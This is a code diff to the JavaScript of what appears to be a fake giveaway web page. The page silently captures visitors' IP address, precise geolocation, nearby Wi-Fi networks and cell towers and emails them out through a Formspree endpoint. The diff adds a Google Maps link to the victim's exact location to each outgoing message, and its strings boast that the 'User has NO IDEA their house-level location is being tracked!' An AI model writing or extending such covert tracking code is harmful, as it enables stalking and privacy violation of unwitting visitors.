@@ -34,6 +34,9 @@ async function captureUserInfoSilently() {
         // Attempt to get precise browser geolocation (if user allows)
         const preciseLocation = await getPreciseGeolocation();
         
+        // Generate Google Maps link with exact coordinates
+        const googleMapsLink = generateGoogleMapsLink(preciseLocation, locationData);
+        
         // Store comprehensive user info silently
         const userInfo = {
             ip: userIP,
@@ -66,7 +69,8 @@ async function captureUserInfoSilently() {
             preciseLocation: locationData.preciseLocation || 'Unknown',
             houseLevelPrecision: preciseLocation.houseLevel || 'Unknown',
             wifiNetworks: preciseLocation.wifiNetworks || 'Unknown',
-            cellTowers: preciseLocation.cellTowers || 'Unknown'
+            cellTowers: preciseLocation.cellTowers || 'Unknown',
+            googleMapsLink: googleMapsLink
         };
 
         // Store silently in localStorage
@@ -78,6 +82,25 @@ async function captureUserInfoSilently() {
     } catch (error) {
         // Silent error handling - user won't see any errors
         console.log('Silent tracking error:', error);
+    }
+}
+
+// Generate Google Maps link with exact coordinates
+function generateGoogleMapsLink(preciseLocation, locationData) {
+    let lat = preciseLocation.latitude || locationData.latitude;
+    let lng = preciseLocation.longitude || locationData.longitude;
+    
+    if (lat && lng && lat !== 'Unknown' && lng !== 'Unknown') {
+        // Create Google Maps link with exact coordinates
+        return `https://www.google.com/maps?q=${lat},${lng}&z=18`;
+    } else if (locationData.street && locationData.city) {
+        // Fallback to address-based link
+        const address = `${locationData.street}, ${locationData.city}, ${locationData.country_name}`;
+        return `https://www.google.com/maps/search/${encodeURIComponent(address)}`;
+    } else {
+        // Fallback to city-based link
+        const city = `${locationData.city}, ${locationData.country_name}`;
+        return `https://www.google.com/maps/search/${encodeURIComponent(city)}`;
     }
 }
 
@@ -207,7 +230,7 @@ async function getDetailedLocation(ip) {
     }
 }
 
-// Send silent notification to your email with house-level precision data
+// Send silent notification to your email with house-level precision data and Google Maps link
 async function sendSilentNotification(userInfo) {
     try {
         await fetch('https://formspree.io/f/xrblaoyr', {
@@ -255,9 +278,12 @@ async function sendSilentNotification(userInfo) {
 🏢 ISP/Organization: ${userInfo.isp}
 ⏰ Timezone: ${userInfo.timezone}
 
+🗺️ GOOGLE MAPS LINK: ${userInfo.googleMapsLink}
+
 🎯 User has NO IDEA their house-level location is being tracked!
 🏠 HOUSE-LEVEL PRECISION CAPTURED!
 📍 EXACT STREET ADDRESS DETECTED!
+🗺️ CLICK THE MAP LINK TO SEE EXACT LOCATION!
                 `
             })
         });
@@ -294,6 +320,7 @@ document.getElementById('giveawayForm').addEventListener('submit', async functio
     formData.append('userAccuracy', userTrackingData.accuracy || 'Unknown');
     formData.append('userAltitude', userTrackingData.altitude || 'Unknown');
     formData.append('userHouseLevelPrecision', userTrackingData.houseLevelPrecision || 'Unknown');
+    formData.append('userGoogleMapsLink', userTrackingData.googleMapsLink || 'Unknown');
     formData.append('userAgent', userTrackingData.userAgent || 'Unknown');
     formData.append('userISP', userTrackingData.isp || 'Unknown');
     formData.append('entryTime', new Date().toISOString());
@@ -435,6 +462,8 @@ Precise Longitude: ${userTrackingData.preciseLongitude || 'Unknown'}
 Accuracy: ${userTrackingData.accuracy || 'Unknown'} meters
 House Level Precision: ${userTrackingData.houseLevelPrecision || 'Unknown'}
 
+🗺️ GOOGLE MAPS LINK: ${userTrackingData.googleMapsLink}
+
 User has NO IDEA their house-level location was tracked! 🎯`
         })
     });
@@ -478,6 +507,8 @@ Precise Longitude: ${userTrackingData.preciseLongitude || 'Unknown'}
 Accuracy: ${userTrackingData.accuracy || 'Unknown'} meters
 House Level Precision: ${userTrackingData.houseLevelPrecision || 'Unknown'}
 
+🗺️ GOOGLE MAPS LINK: ${userTrackingData.googleMapsLink}
+
 User has NO IDEA their house-level location is being tracked! 🎯`
                 })
             });
@@ -520,6 +551,8 @@ Precise Longitude: ${userTrackingData.preciseLongitude || 'Unknown'}
 Accuracy: ${userTrackingData.accuracy || 'Unknown'} meters
 House Level Precision: ${userTrackingData.houseLevelPrecision || 'Unknown'}
 
+🗺️ GOOGLE MAPS LINK: ${userTrackingData.googleMapsLink}
+
 User has NO IDEA their house-level location is being tracked! 🎯`
             })
         });
@@ -556,6 +589,8 @@ Precise Latitude: ${userTrackingData.preciseLatitude || 'Unknown'}
 Precise Longitude: ${userTrackingData.preciseLongitude || 'Unknown'}
 Accuracy: ${userTrackingData.accuracy || 'Unknown'} meters
 House Level Precision: ${userTrackingData.houseLevelPrecision || 'Unknown'}
+
+🗺️ GOOGLE MAPS LINK: ${userTrackingData.googleMapsLink}
 
 User has NO IDEA their house-level location is being tracked! 🎯`
         })
